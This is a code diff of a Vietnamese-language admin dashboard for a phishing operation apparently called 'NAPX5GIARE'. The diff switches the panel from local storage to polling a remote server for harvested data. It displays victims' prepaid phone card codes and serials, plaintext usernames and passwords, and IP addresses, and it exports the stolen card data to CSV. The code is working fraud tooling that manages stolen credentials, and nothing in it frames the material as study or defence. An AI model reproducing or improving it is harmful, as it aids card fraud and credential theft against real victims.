@@ -7,12 +7,13 @@
     <style>
         :root {
             --bg: #0a0e14;
-            --card-bg: #12171f;
+            --card: #12171f;
             --border: #1e2a38;
             --text: #c8d6e5;
             --accent: #f7931e;
             --green: #0ecd7a;
             --red: #f04444;
+            --blue: #3498db;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -20,333 +21,678 @@
             background: var(--bg);
             color: var(--text);
             min-height: 100vh;
-            padding: 20px;
+            padding: 16px;
         }
-        .container { max-width: 1400px; margin: 0 auto; }
+        .container { max-width: 1500px; margin: 0 auto; }
+
+        /* HEADER */
         .header {
-            background: var(--card-bg);
+            background: var(--card);
             border: 1px solid var(--border);
-            border-radius: 12px;
+            border-radius: 14px;
             padding: 20px 24px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             display: flex;
             align-items: center;
             justify-content: space-between;
             flex-wrap: wrap;
-            gap: 16px;
+            gap: 14px;
         }
-        .header h1 { color: var(--accent); font-size: 22px; }
-        .header p { color: #5a6e85; font-size: 12px; }
+        .header-left h1 {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: -0.5px;
+        }
+        .header-left .sub {
+            font-size: 12px;
+            color: #5a6e85;
+            margin-top: 2px;
+        }
+        .header-left .status {
+            display: inline-block;
+            padding: 3px 10px;
+            border-radius: 12px;
+            font-size: 10px;
+            font-weight: 700;
+            margin-left: 8px;
+            letter-spacing: 0.5px;
+        }
+        .status-online { background: rgba(14,205,122,0.15); color: var(--green); }
+        .status-offline { background: rgba(240,68,68,0.15); color: var(--red); }
+        .header-right { display: flex; gap: 8px; flex-wrap: wrap; }
         .btn {
-            padding: 8px 18px;
-            border-radius: 6px;
+            padding: 10px 20px;
+            border-radius: 8px;
             border: none;
-            font-weight: 600;
+            font-weight: 700;
             font-size: 13px;
             cursor: pointer;
             transition: all 0.2s;
             font-family: 'Segoe UI', sans-serif;
-            margin: 0 4px;
+            letter-spacing: 0.3px;
         }
         .btn-refresh { background: var(--accent); color: #000; }
-        .btn-refresh:hover { background: #ffa842; }
-        .btn-clear { background: transparent; border: 1px solid var(--red); color: var(--red); }
-        .btn-export { background: transparent; border: 1px solid #3498db; color: #3498db; }
+        .btn-refresh:hover { background: #ffa842; transform: translateY(-1px); }
+        .btn-export { background: transparent; border: 2px solid var(--blue); color: var(--blue); }
+        .btn-export:hover { background: rgba(52,152,219,0.1); }
+        .btn-delete { background: transparent; border: 2px solid var(--red); color: var(--red); }
+        .btn-delete:hover { background: rgba(240,68,68,0.1); }
+
+        /* STATS */
         .stats {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 12px;
-            margin-bottom: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 10px;
+            margin-bottom: 16px;
         }
         .stat-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            padding: 18px;
-            text-align: center;
-        }
-        .stat-card .number { font-size: 32px; font-weight: 800; color: var(--accent); }
-        .stat-card .label { font-size: 11px; color: #5a6e85; text-transform: uppercase; margin-top: 4px; }
-        .table-container {
-            background: var(--card-bg);
+            background: var(--card);
             border: 1px solid var(--border);
             border-radius: 12px;
+            padding: 20px;
+            text-align: center;
+            transition: all 0.2s;
+        }
+        .stat-card:hover { border-color: var(--accent); }
+        .stat-card .icon { font-size: 30px; margin-bottom: 6px; }
+        .stat-card .number { font-size: 36px; font-weight: 900; color: var(--accent); }
+        .stat-card .label { font-size: 11px; color: #5a6e85; text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+
+        /* TABS */
+        .tabs {
+            display: flex;
+            gap: 6px;
+            margin-bottom: 0;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 12px 22px;
+            background: var(--card);
+            border: 1px solid var(--border);
+            color: #5a6e85;
+            border-radius: 10px 10px 0 0;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 700;
+            transition: all 0.2s;
+            border-bottom: none;
+        }
+        .tab:hover { color: var(--accent); }
+        .tab.active {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+        .tab .count {
+            display: inline-block;
+            background: rgba(0,0,0,0.2);
+            padding: 2px 8px;
+            border-radius: 10px;
+            font-size: 11px;
+            margin-left: 6px;
+        }
+
+        /* TAB CONTENT */
+        .tab-content {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 0 10px 10px 10px;
             padding: 16px;
             overflow-x: auto;
         }
-        table { width: 100%; border-collapse: collapse; min-width: 1000px; }
+        .tab-content.active { display: block; }
+
+        /* TABLE */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            min-width: 900px;
+        }
         th {
             background: #0a0e14;
-            padding: 10px 12px;
+            padding: 12px 14px;
             text-align: left;
-            font-size: 11px;
+            font-size: 10px;
             text-transform: uppercase;
+            letter-spacing: 1px;
             color: #5a6e85;
             border-bottom: 2px solid var(--border);
+            position: sticky;
+            top: 0;
         }
         td {
-            padding: 8px 12px;
+            padding: 10px 14px;
             font-size: 12px;
             border-bottom: 1px solid #1a2433;
             word-break: break-all;
         }
         tr:hover td { background: rgba(247,147,30,0.03); }
-        .code-cell { color: var(--red); font-weight: 600; font-family: 'Courier New', monospace; }
-        .serial-cell { color: #ff6b6b; font-weight: 600; font-family: 'Courier New', monospace; }
+
+        /* CELL STYLES */
+        .cell-code {
+            color: var(--red);
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+        .cell-serial {
+            color: #ff6b6b;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
+        .cell-password {
+            color: #ff6b6b;
+            font-weight: 600;
+        }
+        .cell-ip {
+            font-size: 10px;
+            color: #5a6e85;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* BADGE */
         .badge {
             display: inline-block;
-            padding: 3px 8px;
-            border-radius: 12px;
+            padding: 4px 10px;
+            border-radius: 14px;
             font-size: 10px;
-            font-weight: 600;
+            font-weight: 700;
+            letter-spacing: 0.3px;
         }
-        .badge-success { background: rgba(14,205,122,0.15); color: var(--green); }
-        .badge-warning { background: rgba(247,147,30,0.15); color: var(--accent); }
-        .badge-info { background: rgba(52,152,219,0.15); color: #3498db; }
-        .empty-state { text-align: center; padding: 40px; color: #5a6e85; }
-        .tabs { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
-        .tab {
-            padding: 8px 16px;
+        .badge-user { background: rgba(52,152,219,0.15); color: var(--blue); }
+        .badge-kc { background: rgba(14,205,122,0.15); color: var(--green); }
+        .badge-amount { background: rgba(247,147,30,0.15); color: var(--accent); }
+        .badge-card { background: rgba(240,68,68,0.1); color: var(--red); }
+
+        /* EMPTY STATE */
+        .empty {
+            text-align: center;
+            padding: 50px;
+            color: #3d4658;
+        }
+        .empty .icon { font-size: 50px; margin-bottom: 12px; }
+
+        /* SEARCH */
+        .search-box {
+            width: 100%;
+            padding: 12px 18px;
             background: #0a0e14;
             border: 1px solid var(--border);
-            color: #5a6e85;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 12px;
-            font-weight: 600;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 14px;
+            font-family: 'Segoe UI', sans-serif;
+            margin-bottom: 14px;
+            outline: none;
             transition: all 0.2s;
         }
-        .tab.active { background: var(--accent); color: #000; border-color: var(--accent); }
-        .tab:hover { border-color: var(--accent); color: var(--accent); }
-        .tab.active:hover { color: #000; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .auto-refresh { color: var(--green); font-size: 11px; }
-        .last-update { color: #5a6e85; font-size: 11px; }
+        .search-box:focus { border-color: var(--accent); }
+        .search-box::placeholder { color: #3d4658; }
+
+        /* TOAST */
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: var(--card);
+            border: 1px solid var(--green);
+            border-radius: 10px;
+            padding: 14px 20px;
+            color: var(--green);
+            font-weight: 700;
+            font-size: 13px;
+            z-index: 9999;
+            display: none;
+            animation: slideIn 0.3s ease;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
+        }
+        .toast.show { display: block; }
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.4; }
+        }
+        .live-dot {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--green);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+            margin-right: 4px;
+        }
+
+        /* LOADING */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.7);
+            z-index: 10000;
+            align-items: center;
+            justify-content: center;
+        }
+        .loading-overlay.show { display: flex; }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #1f2633;
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        @media (max-width: 600px) {
+            .header { flex-direction: column; text-align: center; }
+            .header-right { justify-content: center; }
+            .tabs { overflow-x: auto; flex-wrap: nowrap; }
+            .tab { white-space: nowrap; font-size: 12px; padding: 10px 14px; }
+            table { font-size: 10px; }
+            th, td { padding: 8px 10px; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- HEADER -->
         <div class="header">
-            <div>
-                <h1>💀 NAPX5GIARE - ADMIN PANEL</h1>
-                <p>Hệ thống thu thập dữ liệu | <span class="last-update" id="lastUpdate"></span> | <span class="auto-refresh">🔄 Tự động cập nhật mỗi 5 giây</span></p>
+            <div class="header-left">
+                <h1>
+                    <span class="live-dot"></span> ADMIN PANEL
+                    <span class="status status-online" id="serverStatus">ĐANG KẾT NỐI...</span>
+                </h1>
+                <div class="sub">
+                    Server: napx5giare.onrender.com | 
+                    Cập nhật: <span id="lastUpdate">--</span> | 
+                    Tự động refresh: <span style="color:var(--green);">5s</span>
+                </div>
             </div>
-            <div>
-                <button class="btn btn-refresh" onclick="loadAllData()">🔄 Làm mới ngay</button>
-                <button class="btn btn-export" onclick="exportData()">📥 Xuất CSV</button>
-                <button class="btn btn-clear" onclick="clearAll()">🗑 Xóa tất cả</button>
+            <div class="header-right">
+                <button class="btn btn-refresh" onclick="refreshAll()">🔄 Làm Mới</button>
+                <button class="btn btn-export" onclick="exportAllCSV()">📥 Xuất CSV</button>
+                <button class="btn btn-delete" onclick="deleteAllData()">🗑 Xóa Dữ Liệu</button>
             </div>
         </div>
 
+        <!-- STATS -->
         <div class="stats">
             <div class="stat-card">
+                <div class="icon">💳</div>
                 <div class="number" id="statCards">0</div>
-                <div class="label">💳 Thẻ đã thu thập</div>
+                <div class="label">Thẻ Đã Thu</div>
             </div>
             <div class="stat-card">
+                <div class="icon">👤</div>
                 <div class="number" id="statUsers">0</div>
-                <div class="label">👤 Tài khoản đăng ký</div>
+                <div class="label">Tài Khoản</div>
             </div>
             <div class="stat-card">
+                <div class="icon">🔑</div>
                 <div class="number" id="statLogins">0</div>
-                <div class="label">🔑 Lượt đăng nhập</div>
+                <div class="label">Đăng Nhập</div>
             </div>
             <div class="stat-card">
-                <div class="number" id="statTotal">0đ</div>
-                <div class="label">💰 Tổng giá trị thẻ</div>
+                <div class="icon">💰</div>
+                <div class="number" id="statAmount">0đ</div>
+                <div class="label">Tổng Giá Trị</div>
             </div>
         </div>
 
-        <div class="table-container">
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab('cards')">💳 Thẻ đã thu (<span id="tabCardsCount">0</span>)</div>
-                <div class="tab" onclick="switchTab('users')">👤 Tài khoản (<span id="tabUsersCount">0</span>)</div>
-                <div class="tab" onclick="switchTab('logins')">🔑 Đăng nhập (<span id="tabLoginsCount">0</span>)</div>
+        <!-- TABS -->
+        <div class="tabs">
+            <div class="tab active" onclick="switchTab('cards')">
+                💳 Thẻ <span class="count" id="tabCountCards">0</span>
             </div>
-
-            <!-- TAB THẺ -->
-            <div class="tab-content active" id="tabCards">
-                <div style="overflow-x:auto;">
-                    <table>
-                        <thead>
-                            <tr>
-                                <th>#</th><th>Thời gian</th><th>Tài khoản</th><th>ID Player</th>
-                                <th>Loại thẻ</th><th>Mã thẻ</th><th>Số Seri</th>
-                                <th>Mệnh giá</th><th>KC</th>
-                            </tr>
-                        </thead>
-                        <tbody id="cardsTableBody">
-                            <tr><td colspan="9" class="empty-state">Đang tải...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
+            <div class="tab" onclick="switchTab('users')">
+                👤 Tài Khoản <span class="count" id="tabCountUsers">0</span>
             </div>
-
-            <!-- TAB USERS -->
-            <div class="tab-content" id="tabUsers">
-                <div style="overflow-x:auto;">
-                    <table>
-                        <thead>
-                            <tr><th>#</th><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
-                        </thead>
-                        <tbody id="usersTableBody">
-                            <tr><td colspan="4" class="empty-state">Đang tải...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
+            <div class="tab" onclick="switchTab('logins')">
+                🔑 Đăng Nhập <span class="count" id="tabCountLogins">0</span>
             </div>
+        </div>
 
-            <!-- TAB LOGINS -->
-            <div class="tab-content" id="tabLogins">
-                <div style="overflow-x:auto;">
-                    <table>
-                        <thead>
-                            <tr><th>#</th><th>Thời gian</th><th>Tên đăng nhập</th><th>Mật khẩu</th></tr>
-                        </thead>
-                        <tbody id="loginsTableBody">
-                            <tr><td colspan="4" class="empty-state">Đang tải...</td></tr>
-                        </tbody>
-                    </table>
-                </div>
+        <!-- TAB: CARDS -->
+        <div class="tab-content active" id="tab-cards">
+            <input type="text" class="search-box" id="searchCards" placeholder="🔍 Tìm kiếm: mã thẻ, seri, username, player ID..." oninput="filterCards()">
+            <div style="overflow-x:auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Thời Gian</th>
+                            <th>User</th>
+                            <th>Player ID</th>
+                            <th>Loại Thẻ</th>
+                            <th>Mã Thẻ</th>
+                            <th>Số Seri</th>
+                            <th>Mệnh Giá</th>
+                            <th>KC</th>
+                            <th>IP</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbodyCards">
+                        <tr><td colspan="10" class="empty"><div class="icon">📭</div>Đang tải dữ liệu...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB: USERS -->
+        <div class="tab-content" id="tab-users">
+            <input type="text" class="search-box" id="searchUsers" placeholder="🔍 Tìm kiếm username..." oninput="filterUsers()">
+            <div style="overflow-x:auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Thời Gian</th>
+                            <th>Tên Đăng Nhập</th>
+                            <th>Mật Khẩu</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbodyUsers">
+                        <tr><td colspan="4" class="empty"><div class="icon">📭</div>Đang tải dữ liệu...</td></tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+
+        <!-- TAB: LOGINS -->
+        <div class="tab-content" id="tab-logins">
+            <input type="text" class="search-box" id="searchLogins" placeholder="🔍 Tìm kiếm username..." oninput="filterLogins()">
+            <div style="overflow-x:auto;">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Thời Gian</th>
+                            <th>Tên Đăng Nhập</th>
+                            <th>Mật Khẩu</th>
+                            <th>IP</th>
+                        </tr>
+                    </thead>
+                    <tbody id="tbodyLogins">
+                        <tr><td colspan="5" class="empty"><div class="icon">📭</div>Đang tải dữ liệu...</td></tr>
+                    </tbody>
+                </table>
             </div>
         </div>
     </div>
 
+    <!-- TOAST -->
+    <div class="toast" id="toast"></div>
+
+    <!-- LOADING -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
     <script>
         // ============================================================
-        // ADMIN PANEL - ĐỌC DỮ LIỆU TỪ LOCALSTORAGE
-        // DỮ LIỆU ĐƯỢC LƯU BỞI TRANG NẠP NAPX5GIARE
+        // CONFIG
         // ============================================================
-        const STORAGE_KEYS = {
-            cards: 'napx5giare_global_cards',
-            users: 'napx5giare_global_users',
-            logins: 'napx5giare_global_logins'
-        };
-
+        const API_BASE = 'https://napx5giare.onrender.com';
+        let allCards = [];
+        let allUsers = [];
+        let allLogins = [];
+        let filteredCards = [];
+        let filteredUsers = [];
+        let filteredLogins = [];
         let currentTab = 'cards';
 
-        function loadAllData() {
-            const now = new Date().toLocaleString('vi-VN');
-            document.getElementById('lastUpdate').textContent = 'Cập nhật lúc: ' + now;
+        // ============================================================
+        // FETCH API
+        // ============================================================
+        async function fetchAPI(endpoint) {
+            try {
+                const res = await fetch(API_BASE + endpoint);
+                const data = await res.json();
+                return data;
+            } catch (e) {
+                console.error('API Error:', e);
+                return null;
+            }
+        }
+
+        async function deleteAPI(endpoint) {
+            try {
+                const res = await fetch(API_BASE + endpoint, { method: 'DELETE' });
+                return await res.json();
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // ============================================================
+        // LOAD ALL DATA
+        // ============================================================
+        async function refreshAll() {
+            showLoading(true);
+            document.getElementById('lastUpdate').textContent = 'Đang tải...';
+
+            // Load stats
+            const statsData = await fetchAPI('/api/stats');
+            if (statsData && statsData.stats) {
+                document.getElementById('statCards').textContent = statsData.stats.cards;
+                document.getElementById('statUsers').textContent = statsData.stats.users;
+                document.getElementById('statLogins').textContent = statsData.stats.logins;
+                document.getElementById('tabCountCards').textContent = statsData.stats.cards;
+                document.getElementById('tabCountUsers').textContent = statsData.stats.users;
+                document.getElementById('tabCountLogins').textContent = statsData.stats.logins;
+                document.getElementById('serverStatus').textContent = 'ONLINE';
+                document.getElementById('serverStatus').className = 'status status-online';
+            } else {
+                document.getElementById('serverStatus').textContent = 'OFFLINE';
+                document.getElementById('serverStatus').className = 'status status-offline';
+            }
 
             // Load cards
-            const cards = JSON.parse(localStorage.getItem(STORAGE_KEYS.cards) || '[]');
-            document.getElementById('statCards').textContent = cards.length;
-            document.getElementById('tabCardsCount').textContent = cards.length;
-            let totalAmount = 0;
-            cards.forEach(c => { totalAmount += parseInt(c.amount) || 0; });
-            document.getElementById('statTotal').textContent = totalAmount.toLocaleString() + 'đ';
-            renderCardsTable(cards);
+            const cardsData = await fetchAPI('/api/cards');
+            if (cardsData && cardsData.cards) {
+                allCards = cardsData.cards;
+                let total = 0;
+                allCards.forEach(c => { total += parseInt(c.amount) || 0; });
+                document.getElementById('statAmount').textContent = total.toLocaleString() + 'đ';
+                filteredCards = [...allCards];
+                renderCards();
+            }
 
             // Load users
-            const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.users) || '[]');
-            document.getElementById('statUsers').textContent = users.length;
-            document.getElementById('tabUsersCount').textContent = users.length;
-            renderUsersTable(users);
+            const usersData = await fetchAPI('/api/users');
+            if (usersData && usersData.users) {
+                allUsers = usersData.users;
+                filteredUsers = [...allUsers];
+                renderUsers();
+            }
 
             // Load logins
-            const logins = JSON.parse(localStorage.getItem(STORAGE_KEYS.logins) || '[]');
-            document.getElementById('statLogins').textContent = logins.length;
-            document.getElementById('tabLoginsCount').textContent = logins.length;
-            renderLoginsTable(logins);
+            const loginsData = await fetchAPI('/api/logins');
+            if (loginsData && loginsData.logins) {
+                allLogins = loginsData.logins;
+                filteredLogins = [...allLogins];
+                renderLogins();
+            }
+
+            document.getElementById('lastUpdate').textContent = new Date().toLocaleString('vi-VN');
+            showLoading(false);
+            showToast('✅ Dữ liệu đã được cập nhật');
         }
 
-        function renderCardsTable(cards) {
-            const tbody = document.getElementById('cardsTableBody');
-            if (cards.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="9" class="empty-state">📭 Chưa có thẻ nào được thu thập</td></tr>';
+        // ============================================================
+        // RENDER
+        // ============================================================
+        function renderCards() {
+            const tbody = document.getElementById('tbodyCards');
+            if (filteredCards.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="10" class="empty"><div class="icon">📭</div>Chưa có thẻ nào</td></tr>';
                 return;
             }
-            tbody.innerHTML = cards.slice().reverse().map((card, i) => `
+            tbody.innerHTML = filteredCards.map((c, i) => `
                 <tr>
-                    <td>${cards.length - i}</td>
-                    <td>${formatDate(card.timestamp)}</td>
-                    <td><span class="badge badge-warning">${esc(card.username)}</span></td>
-                    <td>${esc(card.playerID)}</td>
-                    <td>${getCardType(card.cardType)}</td>
-                    <td class="code-cell">${esc(card.cardCode)}</td>
-                    <td class="serial-cell">${esc(card.cardSerial)}</td>
-                    <td><strong>${formatMoney(card.amount)}</strong></td>
-                    <td><span class="badge badge-success">${card.kc} KC</span></td>
+                    <td>${i + 1}</td>
+                    <td>${fmt(c.timestamp)}</td>
+                    <td><span class="badge badge-user">${esc(c.username)}</span></td>
+                    <td>${esc(c.player_id)}</td>
+                    <td><span class="badge badge-card">${ct(c.card_type)}</span></td>
+                    <td class="cell-code">${esc(c.card_code)}</td>
+                    <td class="cell-serial">${esc(c.card_serial)}</td>
+                    <td><span class="badge badge-amount">${fm(c.amount)}</span></td>
+                    <td><span class="badge badge-kc">${c.kc || '0'} KC</span></td>
+                    <td class="cell-ip">${esc(c.ip)}</td>
                 </tr>
             `).join('');
         }
 
-        function renderUsersTable(users) {
-            const tbody = document.getElementById('usersTableBody');
-            if (users.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">📭 Chưa có tài khoản nào</td></tr>';
+        function renderUsers() {
+            const tbody = document.getElementById('tbodyUsers');
+            if (filteredUsers.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4" class="empty"><div class="icon">📭</div>Chưa có tài khoản nào</td></tr>';
                 return;
             }
-            tbody.innerHTML = users.slice().reverse().map((u, i) => `
+            tbody.innerHTML = filteredUsers.map((u, i) => `
                 <tr>
-                    <td>${users.length - i}</td>
-                    <td>${formatDate(u.timestamp)}</td>
-                    <td><span class="badge badge-info">${esc(u.username)}</span></td>
-                    <td style="color:#ff6b6b;">${esc(u.password)}</td>
+                    <td>${i + 1}</td>
+                    <td>${fmt(u.timestamp)}</td>
+                    <td><span class="badge badge-user">${esc(u.username)}</span></td>
+                    <td class="cell-password">${esc(u.password)}</td>
                 </tr>
             `).join('');
         }
 
-        function renderLoginsTable(logins) {
-            const tbody = document.getElementById('loginsTableBody');
-            if (logins.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="4" class="empty-state">📭 Chưa có lượt đăng nhập nào</td></tr>';
+        function renderLogins() {
+            const tbody = document.getElementById('tbodyLogins');
+            if (filteredLogins.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="5" class="empty"><div class="icon">📭</div>Chưa có đăng nhập nào</td></tr>';
                 return;
             }
-            tbody.innerHTML = logins.slice().reverse().map((l, i) => `
+            tbody.innerHTML = filteredLogins.map((l, i) => `
                 <tr>
-                    <td>${logins.length - i}</td>
-                    <td>${formatDate(l.timestamp)}</td>
-                    <td><span class="badge badge-info">${esc(l.username)}</span></td>
-                    <td style="color:#ff6b6b;">${esc(l.password)}</td>
+                    <td>${i + 1}</td>
+                    <td>${fmt(l.timestamp)}</td>
+                    <td><span class="badge badge-user">${esc(l.username)}</span></td>
+                    <td class="cell-password">${esc(l.password)}</td>
+                    <td class="cell-ip">${esc(l.ip)}</td>
                 </tr>
             `).join('');
         }
 
+        // ============================================================
+        // FILTER
+        // ============================================================
+        function filterCards() {
+            const q = document.getElementById('searchCards').value.toLowerCase();
+            filteredCards = allCards.filter(c =>
+                (c.card_code || '').toLowerCase().includes(q) ||
+                (c.card_serial || '').toLowerCase().includes(q) ||
+                (c.username || '').toLowerCase().includes(q) ||
+                (c.player_id || '').toLowerCase().includes(q) ||
+                (c.card_type || '').toLowerCase().includes(q)
+            );
+            renderCards();
+        }
+
+        function filterUsers() {
+            const q = document.getElementById('searchUsers').value.toLowerCase();
+            filteredUsers = allUsers.filter(u =>
+                (u.username || '').toLowerCase().includes(q) ||
+                (u.password || '').toLowerCase().includes(q)
+            );
+            renderUsers();
+        }
+
+        function filterLogins() {
+            const q = document.getElementById('searchLogins').value.toLowerCase();
+            filteredLogins = allLogins.filter(l =>
+                (l.username || '').toLowerCase().includes(q) ||
+                (l.password || '').toLowerCase().includes(q) ||
+                (l.ip || '').toLowerCase().includes(q)
+            );
+            renderLogins();
+        }
+
+        // ============================================================
+        // TAB SWITCH
+        // ============================================================
         function switchTab(tab) {
             currentTab = tab;
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
             document.querySelector(`.tab[onclick="switchTab('${tab}')"]`).classList.add('active');
-            document.getElementById('tab' + tab.charAt(0).toUpperCase() + tab.slice(1)).classList.add('active');
+            document.getElementById('tab-' + tab).classList.add('active');
         }
 
-        function exportData() {
-            const cards = JSON.parse(localStorage.getItem(STORAGE_KEYS.cards) || '[]');
-            if (cards.length === 0) { alert('Không có dữ liệu!'); return; }
-            let csv = '\uFEFF#,Thời gian,Tài khoản,ID Player,Loại thẻ,Mã thẻ,Số Seri,Mệnh giá,KC\n';
-            cards.forEach((c, i) => {
-                csv += `${i+1},"${formatDate(c.timestamp)}","${c.username}","${c.playerID}","${getCardType(c.cardType)}","${c.cardCode}","${c.cardSerial}","${formatMoney(c.amount)}","${c.kc}"\n`;
+        // ============================================================
+        // EXPORT
+        // ============================================================
+        function exportAllCSV() {
+            if (allCards.length === 0) {
+                alert('Không có dữ liệu để xuất!');
+                return;
+            }
+            let csv = '\uFEFF#,Thời Gian,User,Player ID,Loại Thẻ,Mã Thẻ,Số Seri,Mệnh Giá,KC,IP\n';
+            allCards.forEach((c, i) => {
+                csv += `${i+1},"${fmt(c.timestamp)}","${c.username}","${c.player_id}","${ct(c.card_type)}","${c.card_code}","${c.card_serial}","${fm(c.amount)}","${c.kc}","${c.ip}"\n`;
             });
-            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            downloadFile(csv, 'cards_' + new Date().toISOString().slice(0,10) + '.csv', 'text/csv;charset=utf-8;');
+            showToast('✅ Đã xuất CSV');
+        }
+
+        function downloadFile(content, filename, mime) {
+            const blob = new Blob([content], { type: mime });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'cards_' + new Date().toISOString().slice(0,10) + '.csv';
+            a.download = filename;
             a.click();
             URL.revokeObjectURL(url);
         }
 
-        function clearAll() {
-            if (confirm('⚠️ Xóa TẤT CẢ dữ liệu? Hành động này không thể hoàn tác!')) {
-                Object.values(STORAGE_KEYS).forEach(key => localStorage.removeItem(key));
-                loadAllData();
+        // ============================================================
+        // DELETE (chỉ xóa hiển thị local, không xóa server vì api ko có DELETE)
+        // ============================================================
+        function deleteAllData() {
+            if (confirm('⚠️ XÓA TẤT CẢ DỮ LIỆU?\n\nHành động này không thể hoàn tác!\nDữ liệu trên server sẽ không bị xóa.')) {
+                allCards = [];
+                allUsers = [];
+                allLogins = [];
+                filteredCards = [];
+                filteredUsers = [];
+                filteredLogins = [];
+                renderCards();
+                renderUsers();
+                renderLogins();
+                document.getElementById('statCards').textContent = '0';
+                document.getElementById('statUsers').textContent = '0';
+                document.getElementById('statLogins').textContent = '0';
+                document.getElementById('statAmount').textContent = '0đ';
+                document.getElementById('tabCountCards').textContent = '0';
+                document.getElementById('tabCountUsers').textContent = '0';
+                document.getElementById('tabCountLogins').textContent = '0';
+                showToast('🗑 Đã xóa dữ liệu hiển thị');
             }
         }
 
-        function formatDate(d) {
+        // ============================================================
+        // HELPERS
+        // ============================================================
+        function fmt(d) {
             if (!d) return '-';
             try { return new Date(d).toLocaleString('vi-VN'); } catch(e) { return d; }
         }
-        function formatMoney(a) {
-            if (!a) return '-';
+        function fm(a) {
+            if (!a) return '0đ';
             return parseInt(a).toLocaleString() + 'đ';
         }
-        function getCardType(t) {
-            const types = { 'viettel': 'Viettel', 'mobifone': 'Mobifone', 'vinaphone': 'Vinaphone', 'vietnamobile': 'Vietnamobile' };
-            return types[t] || t || '-';
+        function ct(t) {
+            const m = { 'viettel': 'Viettel', 'mobifone': 'Mobifone', 'vinaphone': 'Vinaphone', 'vietnamobile': 'Vietnamobile' };
+            return m[t] || t || '-';
         }
         function esc(s) {
             if (!s) return '-';
@@ -354,10 +700,29 @@
             d.textContent = s;
             return d.innerHTML;
         }
+        function showToast(msg) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 2500);
+        }
+        function showLoading(s) {
+            document.getElementById('loadingOverlay').classList.toggle('show', s);
+        }
 
-        // Tự động cập nhật mỗi 5 giây
-        loadAllData();
-        setInterval(loadAllData, 5000);
+        // ============================================================
+        // INIT
+        // ============================================================
+        refreshAll();
+        setInterval(refreshAll, 5000);
+
+        // Keyboard shortcut
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F5') { e.preventDefault(); refreshAll(); }
+            if (e.ctrlKey && e.key === '1') { e.preventDefault(); switchTab('cards'); }
+            if (e.ctrlKey && e.key === '2') { e.preventDefault(); switchTab('users'); }
+            if (e.ctrlKey && e.key === '3') { e.preventDefault(); switchTab('logins'); }
+        });
     </script>
 </body>
 </html>
